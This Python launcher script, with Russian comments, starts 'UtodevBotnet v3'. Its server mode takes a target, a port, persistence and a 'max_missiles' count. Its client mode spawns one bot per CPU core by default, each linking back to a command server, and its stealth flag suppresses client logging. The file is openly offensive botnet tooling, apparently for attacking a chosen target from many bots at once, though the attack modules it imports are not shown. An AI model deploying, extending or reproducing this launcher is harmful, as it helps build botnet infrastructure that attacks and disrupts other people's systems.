#!/usr/bin/env python3

"""
UtodevBotnet v3

Скрипт для запуска нескольких экземпляров UtodevBotnet.
"""

import argparse
from copy import copy
import logging
import os
import platform
import sys
from typing import Tuple

from utils import bordered


LOGGER = logging.getLogger("UtodevBotnet_Launcher")
LOGGER.setLevel(logging.INFO)
LOGGER.addHandler(logging.StreamHandler(sys.stdout))


def get_live_message(title: str, args: argparse.Namespace):
    """Получить визуально привлекательное статусное сообщение.

    :param title: Заголовок.
    :type title: str
    :param args: Аргументы.
    :type args: argparse.Namespace
    :return: Сообщение статуса.
    :rtype: str
    """
    # pylint: disable=import-outside-toplevel
    import chalk

    title_msg = chalk.green(title)
    arg_msg = '\n'.join(
        f'{name.title()}: {chalk.blue(value)}'
        for name, value in vars(args).items()
    )
    message = f'{title_msg}\n{arg_msg}'
    return bordered(message, num_internal_colors=1)


def launch_server(args: argparse.Namespace):
    """
    Запустить сервер UtodevBotnet.
    :param args: Аргументы.
    :type args: argparse.Namespace
    """
    # pylint: disable=import-outside-toplevel, duplicate-code
    from server.server import UtodevBotnetServer

    msg_args = copy(args)
    msg_args.__dict__.pop('target')
    LOGGER.info(get_live_message("Сервер UtodevBotnet запущен!", msg_args))
    if args.gui:
        if platform.system() == 'Windows':
            from server.logger import WinNamedPipeHandler, UnixNamedPipeHandler

            logging.getLogger('UtodevBotnet_Server').addHandler(
                WinNamedPipeHandler(wait_for_pipe=True)
            )
        else:
            from server.logger import UnixNamedPipeHandler

            logging.getLogger('UtodevBotnet_Server').addHandler(
                UnixNamedPipeHandler(wait_for_pipe=True)
            )
    server = UtodevBotnetServer(
        args.target, args.port,
        args.persistent,
        args.max_missiles
    )
    server.launch()


def launch_client(args: argparse.Namespace):
    """
    Запускает клиент UtodevBotnet.
    :param args: Аргументы.
    :type args: argparse.Namespace
    """
    # pylint: disable=import-outside-toplevel
    import asyncio
    from threading import Thread

    from client.bot import Comms

    if platform.system() == 'Windows':
        asyncio.set_event_loop_policy(
            asyncio.WindowsSelectorEventLoopPolicy()
        )

    # Парсинг аргументов.
    root_ip = args.root_ip
    root_port = args.root_port
    num_processes = args.num_processes
    if args.stealth:
        logging.getLogger('UtodevBotnet_Client').setLevel(logging.ERROR)
    LOGGER.info(get_live_message("Запуск UtodevBotnet v3", args))

    threads = [
        Thread(
            target=lambda: asyncio.new_event_loop().run_until_complete(
                Comms(root_ip, root_port).monitor()
            ),
        ) for _ in range(num_processes)
    ]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()


def create_parser() -> Tuple[
    argparse.ArgumentParser,
    argparse._SubParsersAction
]:
    """
    Создает парсер аргументов с несколькими командами.
    :return: Парсер аргументов с несколькими командами и подпарсеры.
    :rtype: Tuple[argparse.ArgumentParser, argparse.ArgumentParser]
    """

    class CustomParser(argparse.ArgumentParser):
        """
        Пользовательский парсер для форматирования строки ошибки.
        """
        def error(self, message):
            if "{Client / Server}" in message:
                LOGGER.info(
                    "Необходимо указать 'client' или 'server' "
                    "в качестве первого аргумента."
                )
                sys.exit(1)
            super().error(message)

    class CustomFormatter(argparse.ArgumentDefaultsHelpFormatter):
        """
        Пользовательский форматтер для текста справки.
        """
        def _get_help_string(self, action):
            help_text = super()._get_help_string(action)
            if action.dest == 'num_processes':
                return help_text.replace(
                    '(default: %(default)s)',
                    '(по умолчанию: Количество ядер. [%(default)s])'
                )
            return help_text

    parser = CustomParser(
        description="Запуск UtodevBotnet",
        formatter_class=CustomFormatter
    )
    subparsers = parser.add_subparsers(
        dest="mode",
        required=True,
        metavar="{Client / Server}",
    )
    return parser, subparsers


def add_client_parser(subparsers: argparse._SubParsersAction):
    """
    Добавляет парсер клиента.
    :param subparsers: Подпарсеры.
    :type subparsers: argparse._SubParsersAction
    """
    # pylint: disable=import-outside-toplevel
    from client.bot import modify_parser

    client_parser = subparsers.add_parser(
        "client",
        description="Запуск ботов UtodevBotnet",
        help="Запускает несколько клиентов UtodevBotnet.\n"
        "(Смотрите [launcher.py client -h])"
    )
    modify_parser(client_parser)
    client_parser.add_argument(
        '-n', '--num_processes',
        help='Количество процессов для запуска.',
        default=os.cpu_count(),
        type=int,
    )


def add_server_parser(subparsers: argparse._SubParsersAction):
    """
    Добавляет парсер сервера.
    :param subparsers: Подпарсеры.
    :type subparsers: argparse._SubParsersAction
    """
    # pylint: disable=import-outside-toplevel
    from server.server import modify_parser

    server_parser = subparsers.add_parser(
        "server",
        description="Запуск сервера UtodevBotnet",
        help="Запускает сервер UtodevBotnet.\n"
        "(Смотрите [launcher.py server -h])"
    )
    modify_parser(server_parser)


if __name__ == '__main__':
    created_parser, created_subparsers = create_parser()
    add_client_parser(created_subparsers)
    add_server_parser(created_subparsers)

    parsed_args = created_parser.parse_args()
    launchables = {
        'server': launch_server,
        'client': launch_client
    }
    launchables[parsed_args.mode](parsed_args)
